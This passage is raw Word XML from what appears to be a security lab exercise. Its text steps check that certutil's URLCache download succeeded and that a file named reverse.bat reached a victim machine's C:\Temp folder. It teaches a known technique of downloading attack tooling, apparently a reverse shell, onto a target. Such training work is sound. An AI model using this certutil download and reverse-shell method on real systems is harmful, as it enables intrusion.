          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>erify</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>that</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ertutil was</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>uc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525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252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ful. You</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">hould </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ee o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t si</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r to:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2520"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>tU</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>LC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2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252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ma</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>et</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ly</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="252525"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1800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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="50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252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>erify</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>that</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rever</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e.b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t got</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="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252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">nloaded to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>-PC C:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525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252525"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>dir c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>:\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>windows</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>tem</w:t>
      </w:r>
      <w:r>
        <w:rPr>
